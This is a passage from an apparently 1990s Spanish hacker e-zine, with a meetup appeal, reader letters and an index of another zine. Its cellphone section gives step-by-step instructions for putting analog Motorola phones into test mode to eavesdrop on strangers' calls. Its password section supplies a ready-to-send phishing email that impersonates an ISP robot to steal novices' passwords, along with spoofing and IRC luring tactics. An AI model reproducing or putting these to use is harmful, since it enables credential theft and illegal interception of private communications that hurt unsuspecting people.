
Supongo que la mayoria de las cosas que he contado son obvias y ya las 
sabiais. No he querido inventar nada nuevo, simplemente queria recordar que 
las quedadas son posibles y se hacen (Y molan un monton)

Quiero animar a la gente a moverse, a relacionarse... en USA lo hacen y son
los mejores... จPorque no hacerlo en Espaคa?

A si que ahora que la mayoria esta en la playa, podeis empezar a quedar con
conocidos de la scene, o empezar a conocer gente para quedar... todavia
queda mucho verano. Ir creando grupos en el irc, con nombres como #ibiza,
#torrevieja, #marbella, o donde paseis las vacaciones y empezad a organizar
la fiesta... y quien sabe a lo mejor hasta ligais (:D

* NOTA -- Si alguien quiere organizar una quedada por la zona de levante
(Alicante, Murcia, Cartagena, o alrededores) que me lo haga saber... y a lo 
mejor me acerco a saludar. :) --> el_duke1@hotmail.com


Espero que con estos consejillos la gente se anime a montar reuniones al
estilo de las CON que se montan en USA... pero mientras tanto podeis ir
praticando en vuestro barrio... Y por supuesto no os olvideis llevar las
gafas oscuras :-)

Saludos
                                                        El Duke de Sicilia






ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 10. MOVILES ANALOGICOS REPROGRAMACION Y ESCANEO                           บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Hola, me presento en Saqueadores con un textito puramente practico que te
va a hacer pasar buenos ratos.

     -Por que comprar un scanner para escuchar moviles cuando lo puedes
     tener gratis???

Gran pregunta, quien no tiene un telefonito movil analogico en su casa??,
quien no ha hecho mas de 2000 pst en fotocopias y le han regalado uno???
quien no ha dado de baja uno y lo tiene tirado en el cajon??? .....

Lo primero que teneis que saber es como funciona una comunicacion a traves
de un telefono celular (cosa que yo no voy a explicar) ya que te pasaran
cosas y no sabras que son.
Lo segundo es tricarte un telefono analogico, dicese de Moviline, ya que
con un GSM no haces na de na. (no robes, no esta bien)
Y por ultimo te lees el texto y te partes un poco el coco.

Bueno pues vamos a empezar con el telefono, alguna informacion del siguiente
texto ha sido tomada de otros en ingles y recopilada despues de mucho tiempo,
la colocare traducida y explicada.

Lo primero que hay que hacer es entra en el "Command Mode" del telefono del
telefono, es decir, el telefono funciona a traves de una serie de frecuencias
y atendiendo a una serie de comandos, pues bien lo que consigues entrando en
ese Modo es establecer tu dichos comando manualmente, es decir forzar
frecuencias por ejemplo y escuchar....

Voy a describir la forma de entrar en el modo comando de algunos telefonos,
pero no tiene porque funcionar en el tuyo (en el mio no lo hizo) con lo que
tendras que descubrirlo por ti mismo, tranquilo, despues de eso lo demas esta
chupado.

****************ACCEDIENDO AL MODO TEST****************


Series 95xx:

  Algunos telefonos de las nuevas series no necesitan puentear la masa,
  prueba con la siguiente secuencia:

  FCN + 0 + 0 + * + * + 8 3 7 8 6 6 3 3 + STO

 Me ahorrare hablar de telefonos con maletin instalados y solo voy a
 comentar los portatiles, si hay alguien interesado en los otros que
 hable con los chicos de saqueadores, lo estudien, y hablen conmigo
 (si a ellos les parece bien)

Modelos portatiles:

Hay dos tipos basicamente, los de la tapita (Flip) y los mas grandes, como
los 8000 y la serie Ultra Classic.
Algunos nuevos telefonos de Motorola y Pioneer no tienen tapa pero el
procedimiento es el mismo que para los Flips.

     8000 y Series Ultra Classic.

Si tienes un 8000 lo primero es determinar el Tipo, antes de entrar.
En la parte de atras del movil, abajo, esta el numero F09... (numero de serie)
Si el cuarto digito de este numero es una D, NO puedes reprogramar a traves
del modo comandos, necesitas un programador RTL4154/RTL4153 para hacer
cualquier cambio (ve olvidando y volviendo al principio, buscar un telefono)

Que no tiene D, BIEN! haz lo siguiente:

Quita la bateria y localiza los 12 contactos en la parte de arriba, cerca del
conector de la antena. Estan numerados del 1 al 12 desde arriba izquierda
hasta abajo derecha. Puentea con masa el Pin 6 (arriba derecha) al encender
telefono, usa para ello el Pin 7 (abajo izquierda). Para llegar al Pin 6
haz lo siquiente:

1.  La parte de rriba de la bateria que cubre los contactos esta hueco.
Haz un agujero con cuidado y corta el pastico, ahi esta el Pin 6.

2.  Si no te quieres cargar la bateria aplica 7.5 Voltios externamente
a ambos polos en la parte de abajo del telefono, puentea el Pin 6 al
"arrancar".

Hay mas formas pero con esas dos yo creo que es suficiente.

Series Ultra Classic II:

  Puentea Pin 2 con Pin 4.

Series Micro-Tac "Flip":

Son metodos similares a los de los 8000.

Localiza los tres contactos de la bateria en la parte de atras del telefono
los dos externos son los de la alimentacion y el central es una Masa
"extra", en algunos le sirve al telefono para saber el estado de la
bateria.

Puentea el pin central a el negativo y el telefono al encender lo hara en
modo comandos directamente, este es el metodo seguido por mi, hubiese
sido muy util tener un texto asi para no tener que comerme la cabeza y
descubrirlo.

*************DENTRO DEL MODO COMANDO*******************

Ok. Aqui empieza lo realmente bonito, vamos a ver que podemos hacer con esto,
voy a poner algunos comandos, pero solo unos pocos, es decir, los necesarios,
para no alargarme demasiado, porque como ya dije es un texto eminentemente
practico.

 La pantalla del modo comando...

Veras dos lineas (si tu movil lo permite), pulsa # y pasaras al modo servicios
pero voy a explicar un poco que son estas dos lineas.
Hay 5 tipos de pantallas dependiendo del modelo, uno de 16 digitos, 14, 10
(con dos versiones), 8 y 7 digitos.

Vamos a centrarnos en el analogico.

Display de 14 Caracteres (el mas comun)

      +---------------+
      | A B C D E F G |
      | H I J K L M N |
      +---------------+

ABC = Canal en el que te encuentras
D   = *Modo de proceso de la llamada
EFG = RSSI
H   = **(D)SAT
I   = 1=TX on
J   = 1=Seคal de Tono
K   = Potencia (0-7)
L   = 1=Canal de control
M   = 1=RX Audio off
N   = 1=TX Audio off


*Modo de prodeso de la llamada:
BLANK = AMPS
A = NAMPS High Sub-Channel
B = NAMPS Center Sub-Channel
C = NAMPS Low Sub-Channel

**(D)SAT:
0 = 5970 Hz
1 = 6000 Hz
2 = 6030 Hz
3 = No SAT
------------
0-6 = DSAT Vector
7 = No DSAT

Una vez aqui empezamos las escuchas...

                -Pulsa # para entrar en el modo servicio.

                -Aparecera una especia de prompt con un ' .

                -Pulsa 08# para activar el altavoz

                -Pulsa 11xxxx# donde xxxx es un numero de canal, puedes
                meterlos a voleo, pero sera dificil pillar algo, lo mejor es
                que en la pantalla primera marque numeros y veas por que
                canal te responde tu estacion con el audio, para poder asi
                localizar algunos canales de tu zona. El canal saldra en el
                lugar ABC.

                -Escucha }:-)))


 Ahora describo algunos comandos que puedes introducir, pero muy poquitos.

01#  Reinicia el Telefono.

02#  Te muestra el status del canal en el que te encuentres.

07#  Desactiva el altavoz

08#  Activa el altavoz

11xxxx# Fuerza el telefono a una determinada frecuencia.

12x# Potencia de salida; (0,1-7) 0=Maxima (3 Watts) 7=Minima
     Con esto seras el Rey de la comunicacion en tu zona :-)

40#  Recibe los datos del canal de Voz.
     Muy util cuando pierdas la conversacion y quieras seguirla.

47x# Volumen
     (Para F19CTA ...Series )
                                       X=0, Minimo
                                       X=6, Maximo
                                       X=7, mute
                                       Normal es 4.
     (Para Mini TAC Transceivers)
                                       X=0, Minimo
                                       X=7, Maximo
                                       Normal es 4.
     (For TDMA Transceivers y F09F... Series y de alta potencia)
                                       X=0, Minimo
                                       X=15, Maximo
                                       Normal es 2 a 4.

56#  Este es muy gracioso, es un test de iluminacion.




   Cuando estes escuchando un canal activa el comando 40#, para "escuchar"
   a donde se dirige la conversacion, luego toma los siguientes numeros
   (xxxx) y los metes en el programa en C adjunto, el te devolvera el numero
   de canal despues de hacer una conversion a binario y luego a decimal.

        ???xxxx???    Toma los valores de las xxxx

       Compila esto:

-----------------------------------Corta-----------------------------
/* Convierte los codigos Hex del Motorola
         --Doctor Who                                                */

#include <stdio.h>
main()
{
int st;
while(1)
 {
  printf("\n XXXXNNNXXX\n Enter digits hex digits NNN: ");
  scanf("%x",&st);
  printf("Channel: %d\n",st & 1023);
 }
}
-----------------------------------Corta-----------------------------


// NOTA: Cruiser incluia una lista de frecuencias de canales en su articulo
original que no aparece aqui debido a su excesiva longitud, esta lista viene
en el mismo zip de la revista con el nombre de freqs.txt, si no tienes este
archivo puedes conseguirlo bajando Saqueadores 10 desde nuestro HomePage en
Geocities. //


Gracias a Mike Larson por su Biblia del Motorola y al Doctor Who por su
conversor para el FOVC (Forward Voice Channel).

No suelto el rollo legal y demas, pero que sepas si vas a escuchar que es
ilegal y te pueden empapelar y si conoces al tio que estas escuchando no
le digas nada, simplemente escucha y CALLA! o yo mismo te buscare para
meterte el movil por el culo.

                                              -  Cruiser  -





ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 11. COLABORACIONES Y PETICIONES                                           บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Pues nada, no os relajeis, habeis superado todas nuestras expectativas con
respuestas, articulos... de tal modo que en este numero hemos tenido que
dejar mucho fuera para no pasarnos (y eso que este es el *numero mas largo*
en la historia de Saqueadores).
Seguid asi, leemos todo lo que llega (esperamos que llegue todo lo que se
manda pero quien sabe) e intentamos publicar la mayor parte de los articulos
y contestar la mayor parte de los mensajes. Tened paciencia, estamos pensando
incluso poner en nuestro web alguno de los articulos que no vayan a aparecer
en Saqueadores (por extension, por tocar temas ya tratados mas ampliamente..)
seria una forma de "homenaje" a todos los que colaborais con nosotros.
Lo importante de una revista es que este "viva" y en una revista "virtual"
solo se sabe por los mails, las visitas al Web.. nosotros no estamos con la
OJD ni tenemos cifras de ventas ni nada de eso, solo a vosotros.
Pero creemos que es mas que suficiente. :-)
Ahora voy a intentar aclarar un poquito las cosas en cuanto a "quien es
quien" y como estan las cosas:

- Todos los interesados en suscripcion, entrar en la lista de correo de
Saqueadores, distribucion de la revista y demas aspectos "administrativos"

El Duke de Sicilia <el_duke1@hotmail.com>
Si HotMail no responde <el_duke@usa.net>

- Los que quieran puntualizar, aคadir o corregir algun articulo.

A su autor y si no hay direccion e-mail, enviadselo a:
El Duke de Sicilia <el_duke1@hotmail.com> o a
Eljaker <eljaker@hotmail.com>

- Los que tengan articulos para enviar, bugs o cualquier cosa "publicable"
asi como los que quieran dar su opinion sobre la revista en general y/o sobre
el web y los que quieran enviar dinero ;-) a

Paseante <paseante@geocities.com>

Preocupado por el correo seguro?. Utiliza las LLAVES PGP que vienen al
final de la revista (si es que aun no las tenias).


Nuestra HomePage: http://www.geocities.com/SiliconValley/8726
La pagina de Vanhackez: http://vanhackez.islatortuga.com
(con muchos links, programas y los numeros de Saqueadores of course!)


Si intentais contactar con algun miembro de Saqueadores o con alguno
de los que han escrito en la revista y no os contesta no os preocupeis.
No sabemos que pasa!!. Pero a veces la gente 'desaparece' y no por motivos
como los del mes pasado.

Para los que todavia esperan la "revision" de los temas tratados en
anteriores numeros de Saqueadores avisarles de que esto no se va a hacer
ya que en nuestro site -seccion revistas- existe un archivo ("content.zip")
que incluye los indices de los numeros 1-10, el que quiera saber de que
se ha tratado en SET ya sabe lo que tiene que hacer. :-)

He contestado a casi todos los mensajes que han llegado, si alguien mando
un mensaje que requeria respuesta y lleva tiempo esperando que me de un
toque, puede que la ida o la vuelta se hayan perdido por el ciberespacio
(tambien hay alternativas mas paranoicas)

Para los que nos leen en los paises de habla hispana en America o en
cualquier pais extranjero, escribidnos!!. Queremos saber como esta alli
el panorama, que se piensa de la revista.. Venga, que no cuesta nada
enviar un mensaje.






ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 12. LAS MEJORES PUBLICACIONES EN INGLES // INDICE DE LA REVISTA FEH       บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Aqui estamos otra vez con esta seccion y otra vez con una de las publicaciones
clasicas en el mundo hacker de alto nivel. La FEH (Fuxin' Eleet Haxors) Una 
de las mejores y mas completas. Con muy buenos articulos tecnicos, de opinion
e incluso de humor.

La FEH editada por ReDragon uno de los grandes gurus del hacking de estos      
ultimos tiempos, y con la colaboracion de muchos de los mas conocidos
hackers de la scene: Hotrod, SnoCrash, Seven Eleven, gheap, Morph, Tele 
Monster, x0x, foo, Okinawa, HoD, john0, SnoNinja, Kamakize, Mythrandir,
t3, etc...

Y os preguntareis por que hago tanto hincapie en los nombres de los 
colaboradores. Lo hago para que os vayan sonando estos nombres, es una
especie de introduccion a la scene hack. Si quereis llegar a ser buenos
hackers teneis que empezar a conocer a la elite del hacking, para que
cuando entreis en los canales de irc de los grandes grupos sepais con
quien merece la pena hablar.

Espero que dentro de pocos aคos vuestros nombres empiecen a sonar en la
scene con tanta fuerza como lo hacen los nombres que os acabo de mencionar.


Los sites oficiales donde podeis encontrarla son: ftp.fc.net/pub/defcon/FEH
y en ftp.2600.com/pub/publications/feh.
Tambien en el site de Underhack en su seccion de Revistas encontrareis
links a esta y otras publicaciones de interes.
[La direccion de Underhack http://underhack.islatortuga.com]



PUNTUACION: 9 (sobre 10)

* Articulos recomendados


Y ahora el indice:
------------------





                               Issue #1
                            July 1st, 1995

Table of Contents:
 1.  Intro (you've already read that part if you've gotten this far)
 2.  Table of Contents (maximum recursion depth exceeded)
 3.  Editorial by Fuxin' Eleet Haxors
 4.  /var/spool/mail/feh
 5.  Some C code by Fuxin' Eleet Haxors
 6.  hack logs by Fuxin' Eleet Haxors
 7.  "Just how eleet is FEH" by Rasputin Worldmonger (thats not his real nick)
 8.  "Teleconf stuff" by Morph (ed: this was too complicated, i didnt read it)
 9.  "Ways to amuse yerself" by Rush2 (other than masturbating)
10.  "The Tack Story" by Hotrod
11.  "The Birth of FEH" by SnoCrash
12.  An Interview with Dale Drew [part 1] by ReDragon
* 13.  "How to Hack Using Scripts [part 1] by Seven Eleven
14.  "How to Hack a Toaster Oven" by bl0ke




                               Issue #2
                           September 24th, 1995

Table of Contents:
General Stuff
    Intro
    Table of Contents
    /var/spool/mail/feh
Technical Articles:
*   Fast TCP/IP Introduction     by ReDragon
    IP Fragmenting               by Anon
    Mail Clobber                 by gheap
    Acrofile Plus                by Morph
    Hacker Light Show            by Tele Monster
Entertaining Articles:
    Hackers Review               by Juliet
    Eleetness of Garage Sales    by x0x
    Installing Sendmail          by foo
    Pumpcon IV Info              by Okinawa
    Pizza Hut Hacking            by HoD
    Weird Al Logs                by john0
    Why Someone is lame          by SnoCrash
    Hacking a Light Switch       by Dhate
    Eleetness of AOL hackers     by Minuteman
    How to Be Eleet              by b0b
    How to Destroy Pac-Man       by Hotrod
    Urination, A Poem            by y
Serious Commentary:
    Trust Among Hackers          by ReDragon
    GUI mentality                by Krosis & ReDragon
    The Evil GUI                 by Krosis
    The Unabomber Manifesto      by FC




                               Issue #3
                          November 9th, 1995

Table of Contents:
General Stuff
    Intro
    Table of Contents
    /var/spool/mail/feh
Technical Articles:
    FOVC C code                  by Ho' DeFone
    TCP Decode in Perl           by entropy
*   SnifFTP                      by ReDragon
Entertaining Articles:
    CERT Advisories              by b0b & casret
    Urban Cow Tipping            by Anonymous
    The REAL #hack FAQ           by t3
    Sekrets of the Superhacker   by morph
    A Sick Article               by xgirl & gwar
    A Poem                       by y
    A Pumpcon Review             by y
    A REAL Pumpcon Review        by Hotrod
    A Bedtime Story              by LANsharc
    The Pantomine Horses         by y
    A0L Spools
    Some other random spool




                               Issue #4
                         December 26th, 1995


Table of Contents:
General Stuff:
    Intro
    Table of Contents
    /var/spool/mail/feh
Technical Articles:
   A Guide to CIPSO                        by Mythrandir
   Linux 'mail-x' Security Holes           by FEH Staff
   Linux 'restorefont' Security Holes      by FEH Staff
   Linux 'filter' Security Holes           by FEH Staff
*  IRC DCC Protocol Security Holes         by FEH Staff
   Example Packet Construction Code        by SnoNinja
Serious Articles:
   Breakfast with the Secret Service       by Kamakize
   Some Thoughts on Hacking                by Mythrandir
*  Gray Areas:  Who's on your side?        by FEH Staff
Entertaining Articles:
   #hack Quotes                            by SnoNinja
   The Word List                           by Allen 3. Smith
   Macs vs. PCs                            by nicotine
   Haxoring an ATM Machine                 by shadow tao
   Department Store Paging                 by Tele Monster
   The Tales of Oof                        by t3
   The Elite Speak Filter                  by SnoNinja
   DefCon Reviews and Other Thoughts       by Zeed


Saludos
                                                      El Duke de Sicilia





ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 13. CLAVE: LLEVATELA POR LA JETA                                          บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Vamos a explicar aqui algo sobre la obtencion de claves, los veteranos de
la revista recordareis los articulos de Eljaker sobre como "pescar" claves
en el IRC, es verdad que posiblemente sea ese el mejor medio para
"ganarse la confianza" de los novatos que desembarcan a millones en
Internet pero a mi personalmente no me gusta, tal vez por que soy mas
paranoico que la mayoria pero eso de que me hagan un /uwho no me va nada
definitivamente.
Yo quiero pescar la clave sin que el novato tenga opcion a saber nada de
mi, es mas sin que ni siquiera _sospeche_ (hasta que sea tarde).
Os preguntareis จy como? algunos incluso habreis ido mas alla y
pensareis, ญya lo tengo!, el tipico truco de llamar por telefono o enviar
un mensaje a un novato haciendose pasar por personal de su proveedor y
solicitando la clave para "comprobaciones". Si pero no.

Vamos a hacerlo de una manera mas... sofisticada ;-) , escribiremos a
nuestro novato *aparentando ser un programa de ordenador*, pensad, los
novatos pueden querer hablar con un ser humano pero no van a ponerse a
discutir con un programa, o bien contestan o dejan de lado el mensaje sin
darle importancia.

Veamos un ejemplo en el que intentaremos hacernos con la clave de
lamer@timo.es


-----------------------------------------------------------------------------
From:ftprobot@timo.es
To:lamer@timo.es
Reply-To:ftprobot@center.com
Subject: Su pagina Web!!

[BODY]

               ญญBienvenido a nuestro sistema!!

NOTA: Este mensaje ha sido generado automaticamente

Recientemente usted se dio de alta con nosotros para acceder a Internet.
Le agradecemos su confianza, como sabra por ser cliente nuestro usted tiene
derecho a poner su propia pagina en Internet de manera GRATUITA.
Hasta ahora para hacer esto usted tenia que completar un largo y complejo
formulario on-line, ahora le ofrecemos la oportunidad de crear el directorio
FTP necesario para tener su pagina de una manera mucho mas comoda y facil.
Ahorrara tiempo y telefono y no tendra que preocuparse de rellenar
complicados formularios.

Para ser uno mas de los cibernautas que tienen su propia pagina en Internet
solo tiene que contestar a este mensaje -Opcion Reply o Reply Mail segun
su programa de correo- y escribir al lado de los campos de mas abajo los
datos requeridos. Tan simple y facil como eso:

E-mail:
Clave:

Ponga su direccion de correo y su clave *vigilando su correcta escritura*
de otra manera el programa sera incapaz de procesar su peticion.

Si no desea crear su directorio FTP simplemente ignore este mensaje.

Le recordamos que una vez creado el directorio FTP aun tendra que diseคar
su pagina Web si no sabe como hacerlo pongase en contacto con nosotros,
nuestras tarifas son extremadamente competitivas.

16-9-95 FTPRobot 4.2.1 by MIT Institute
        Registered version by Timo.es
-----------------------------------------------------------------------------

จQue os parece? };->

Ante esto el novato tiene opciones como:

- Descartar el mensaje, no pasa nada.
- Intentar hablar con el servicio tecnico de su ISP, poco probable,
  no se sabra explicar y es posible que acabe con la cabeza del reves.
- Enviar su clave y su login, sobre todo si se siente moderno y quiere
  'demostrarse' lo "competente" que es en esto de Internet.

Nota: Lo de pongase en contacto con nosotros es para infundir confianza no
espero que lo haga y por si acaso no me "olvido" de mencionar la palabra
magica:         .Tarifas.


Os habreis fijado que el Reply-To es diferente al From. Esto es asi por que
se supone que nosotros no tenemos cuenta en ese proveedor, caso de tenerla
y de poder usarla (por que la cuenta del Reply-To se "quemara" con este uso)
nos seria mas facil (si se puede abrir cuentas es bueno abrirlas con nombres
como info, service, clientes, ftprobot, mailrobot..ya me entendeis).
De todos modos el novato dificilmente se fijara en esto y si se fija จque?
ve que le escribe ftprobot@timo.es y que responde a ftprobot@center.com,
esas son cosas tecnicas que el no entiende, mirad un mensaje con full headers
a ver si no veis los nombres raros que tienen los ordenadores de vuestro
proveedor (oscar.yyyy.es, finet.yyyy.es, etc, etc, etc). No le dara
importancia.

Una recomendacion es no pasarse con esto, si enviais 500 mails de este tipo
se correra la voz, recordad, una llamada de un novato al servicio tecnico no
es problema pero muchas llamadas explicando lo mismo es un problema serio.

Y con esto que?. Muy facil, el novato tendra espacio FTP pero seguramente
tardara un tiempecillo en utilizarlo y nosotros siempre andamos necesitados
de almacenes ;-> , otra cosa curiosa es la posibilidad de abrir una segunda
cuenta de correo. Muchos proveedores permiten tener 2 cuentas de correo, el
novato tardara tiempo en enterarse y saber completar el proceso. Mientras
tanto tenemos una cuenta POP para nosotros solitos.
Por supuesto tambien tenemos acceso a _su_ cuenta pero en este caso no os
aconsejo utilizarla, podria llegar a bajarse alguno de nuestros mensajes!!

Lo que desde luego DESAPRUEBO EXPLICITAMENTE es aprovechar para "putearle",
borrando su correo, usando su cuenta para mandar junk mail o post ofensivos..
Eso es comportamiento de lamers, si no tenemos nada contra el no tenemos
por que fastidiarle, mientras tanto simplemente utilizamos unos recursos que
el no utilizaria. Realmente no es un gran "perjuicio", no os ensaคeis con
alguien aprovechando lo que aprendeis aqui.
[Ademas puede que alguno de vosotros haya recibido uno de esos formularios
ya }:->]
Tened siempre presente la etica del hacker. Mirad pero no tocad.
Algo asi como: "Ante todo que no haya heridos".
Y ademas imaginad el disgusto del pobre hombre (o mujer) que esta todo
ilusionado con Internet si de repente ve que no puede conectarse, que su
correo no va... son gente que en algunos casos ha tenido que
LLAMAR a su proveedor por telefono para que les dijesen.. cual era su propia
direccion e-mail. (veridico) Dejad tranquilos a los pobrecillos.

ญAh! y por supuesto.

-----------------------------------------------------------------------------
From:ftprobot@timo.es
To: lamer@timo.es
Reply-To: ftprobot@center.com
Subject: Confirmacion

[BODY]

Estimado lamer.

Su comando se ha llevado a cabo con exito.

--Extracto del resultado de su comando--

create ftp/usr/~lamer
ftp/usr/~lamer OK
Quit
-----------------------------------------

Su directorio FTP es ahora ftp/usr/~lamer
Cuando haya construido su pagina Web haga un upload a este directorio.

17-9-95 FTPRobot 4.2.1 by MIT Institute
        Registered version by Timo.es
-----------------------------------------------------------------------------


Ya veis, un poco de jerga chorra nunca viene mal, ahora lamer@timo.es tan
feliz y sintiendose casi un genio por haber creado un directorio el solito.
Prevengo de pasarse de recochineo y mandarle mensajes como:
Formatting timo.es master disk drive completed at your request.
Como ya digo, no hay que pasarse. Ya que sera cornudo encima no lo apaleeis.


Hay otras aproximaciones para conseguir el objetivo, si usamos el IRC podemos
entablar conversaciones con novatos y derivar el tema hacia la dificultad
de uso de Internet (tantas preguntas, claves, configuraciones..)
Aprovechamos para dejar caer que "nos parece" que se esta utilizando un
nuevo metodo _mucho mas sencillo_ para crear espacio FTP, si nos sentimos
paranoicos podemos explicarle por query al novato que se trata de un
mensaje al que hay que contestar con la clave y asi evitamos que alguien del
canal que sepa mas del tema empiece a sospechar.
Si hay varios novatos del mismo proveedor conviene que todos se enteren,
frecuentamos el canal/canales unos dias, seleccionamos las presas y mandamos
mails a todos (asi cuando se pregunten entre ellos lo encontraran normal), es
dificil que nadie nos "fiche" hasta entonces puesto que *nunca* habremos
pedido una clave sino simplemente explicado lo que hemos oido acerca de
las "nuevas facilidades" que dan los proveedores.
No se, vosotros mismos, creo que la idea esta clara y estoy seguro de
que alguno sera capaz de aคadir interesantes modificaciones.
Este "acercamiento" esta especialmente indicado para aprovechar las avalanchas
de novatos que se producen con los "regalo de un mes de conexion", "ofertas
de kiosco" y "superofertas de proveedores" que pillan a un publico
completamente desconocedor de lo que es un ordenador y mucho mas aun de lo
que es Internet.  Simplemente no abuseis..demasiado. ;-)






ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 14. LA VOZ DEL LECTOR                                                     บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


Ante la avalancha de mails recibidos hemos decidido retomar la seccion
de la revista destinada a publicar alguno de esos mensajes, para ello hemos
tenido que dejar fuera los que eran de caracter estrictamente privado y
aquellos que contenian tantos datos personales que hacian imposible
reproducirlos sin tener que alterar todo el mensaje.
Si algun mensaje proviene de una cuenta que lleve directamente a un
usuario "real" no incluiremos su direccion de remite por privacidad, si eres
uno de esos usuarios y no te importa que la incluyamos escribenos
indicandolo, asimismo si no quieres que algun mensaje tuyo pueda llegar a
publicarse dilo en tu mail.

Entre todos los que nos han escrito mencion especial a Net-Yonkie.
จPor que?. Juzgad vosotros mismos. Habla Net-Yonkie (mejor escribe)

----------------------------------------------------------------------------

"Aqui te copio lo que les mande a los periodicos (el dia despues de mandarte
el mail a ti). Todavia no me han respondido, pero sigo esperando... por
cierto, copie algunas expresiones que usaste tu en el saquea9, pero es que
me parecio que eran las palabras justas para expresar lo que yo tambien
siento :)"

-        -        -        -        -        -        -        -        -
A la redaccion:
El motivo de mi mail, es denunciar unos hechos que estan ocurriendo y que los
periodicos no tienen conocimiento de ello (o no quieren publicar).
Supongo que todos recordareis la famosa operacion de desmantelamiento del
"jamon y el vino", famosa pagina web en internet. Pues bien, al mismo tiempo
que se daba esa operacion, otra se producia en la sombra. Esta se trata de la
SUPRESION A CONCIENCIA de varios representantes del movimiento hacker en
Espaคa (ojo que digo hacker, no pirateador de software... NO tiene nada que
ver lo uno con lo otro). Esta supresion, se ha cobrado varias victimas -si,
victimas, lo he escrito bien- que no habian hecho absolutamente nada.
A estas personas se las acusa de poseer programas "destinados a alterar o
suprimir la proteccion de otros.." , cosa por la cual media espaคa deberia
estar en la carcel. Pero no es asi. Estas personas eran completamente
anonimas, o eso se pretendia; จporque entonces se las ha perseguido, pinchado
su email, rastreado hasta que se las ha encontrado????? La unica respuesta
posible es que ha sido POR PROMOVER EL HACKING, lo que parece que a las
fuerzas de seguridad no les ha gustado lo mas minimo. Si ellos hubieran
editado un fanzine acerca del "cuidado de las plantas" se les habria detenido
o siquiera buscado? La respuesta clara y rotunda es que NO.
Pero claro... ellos han pensado จcomo acusar a alguien de hacer hacking?
(el acusar a alguien de hacer hacking es como acusarle de pensar... parece
que eso de tener ideas, pensar por uno mismo no esta muy bien visto) Pues
muy sencillo, acusandole de otras cosas completamente irrisorias, y que no
tienen sentido alguno. Siguieron pensando, y se dijeron, "จcomo hacer que la
prensa no se entere? porque claro, somo fuerzas de seguridad, y no podemos
permitir que alguien sepa que atentamos contra el derecho a la libre
expresion. Ah, ya esta! podemos montar otra operacion paralela a la que la
llamaremos operacion jamon y vino, en la que podemos detener a unos cuantos,
y asi con el barullo nadie se entera" Esto es exactamente lo que han hecho.
Es lamentable ver como se le da tan poca importancia en los periodicos (que
la tiene y mucha) a las detenciones de ciertas personas, y ver como hay gente
a la que ni siquiera se menciona. Es triste el ver como se mezcla en un mismo
articulo a los hackers y a los pirateadores de software, QUE NO ES LO MISMO
(nunca me cansare de repetirlo)
Un hacker desea aprender mas cosas, explora, descubre agujeros de seguridad y
los publica o se los dice a otros. Sin ellos, internet no existiria tal y
como es ahora. Son los hackers quienes nos han proporcionado la seguridad de
saber, que si un sistema tiene un agujero, ellos lo descubriran, y se lo
diran al mundo entero, con lo que nuestra seguridad aumenta despues de poner
el consiguiente parche... pero tampoco confio en que muchos entiendan esto...
Como conclusion, solo decir, que espero que la noticia de estas detenciones
de autenticos hackers, no haya llegado hasta vuestra redaccion... porque de
ser asi, y al no ser publicada, estariais contribuyendo a una campaคa de
desinformacion por parte del estado. Asi se contribuye a que nadie conozca a
los hackers... espero que vuestro periodicos no tengan esas actitudes
fascistas, y que empiece a investigar ahora mismo este hecho.

ARRIBA EL HACKING HISPANO!!!!!!!
Firmado:Net-Yonkie
Direccion:netyonkie@hotmail.com

P.D. Este mail ha sido mandado a todos los periodicos de espaคa
-        -        -        -        -        -        -        -        -

"Aproximadamente lo he mandado a unos 54 periodicos, y a unos 3 o 4
periodistas. Tambien a 3 cadenas de TV. Esperemos que sirva de algo"

----------------------------------------------------------------------------

Como diria Jesulin ญim-prezionante!, la verdad es que algunos de los
integrantes de Saqueadores han entrado en estado de shock al leer esto.
El Duke tiene unas ganas enormes de "pasar desapercibido" y supe
inmediatamente que le alegraria el dia si le enviaba una copia de este
mensaje. }:->.
Su frase favorita seria: "En estos momentos la paranoia no es suficiente"
Tampoco se lo reprocho, a mi casa no han venido unos seคores a hacer
preguntas embarazosas. :(
De cualquier manera agradecemos la colaboracion activa de Net-Yonkie.


Una muestra de los comentarios de apoyo que hemos recibido, este
proviene de Wanderer.

----------------------------------------------------------------------------

Estupenda revista, estupendo planteamiento, estupendo grupo.
Lo lamentable es que a la gente como nosotros se nos trate
como se esta tratando a algunos colegas como el caso de Fer
y otros tantos.
Pero seguro que contra todos nosotros no podran, si todos
seguimos unidos y fieles a nuestras ideas.-

HACK THE WORLD!!
----------------------------------------------------------------------------

Os aseguramos que ha sido muy gratificante recibir decenas de comentarios
como este, animandonos a seguir con nuestra tarea y expresando apoyo.


Algunos no solo expresaban apoyo sino que daban ideas y trucos, como
Panic.

----------------------------------------------------------------------------

Hola, antes de nada mi total apoyo con la revista, con la importante labor
que estais realizando y sobre todo animaros a seguir ante las
*inclemencias*.

Pues que leyendo un articulo sobre la revista sobre el Telefono y las
frecuencias, deciais que en una linea de marcacion por pulsos el metodo
para marcar el numero era interumpir el bucle un Nง de veces. Estos cortes
tenian una frecuencia determinada. Ahora va el truquillo.
Pues bien, dado que el margen de error de esa frecuencia es bastante grande
se puede, con un poco de practica, conseguir marcar el Nง de Telefono que
nosotros queramos sin mas que imitar esos cortes con el interruptor de
colgar el telefono. La frecuencia con la que apretemos el interruptor debe
de ser rapida y segura, por lo que tendremos que practicar un poco, y la
pausa entre numero y numero puede ser tan larga como nosotros queramos.
Este truquillo, que aunque a la mayoria de nosotros no nos sirve de nada,
puede venir muy bien para la gente que viva en residencias, que tengan
auriculares de esos que solo sirven para escuchar y no para marcar.
Nada mas, y intentad seguir con la serie sobre las lineas telefonicas que
estaba muy interesante.

Por cierto, no he encriptado el articulo porque no va nada ilegal en el,
espero que no os siente mal.

_______________ Saludos de PANIC desde PUCELA ______________
----------------------------------------------------------------------------

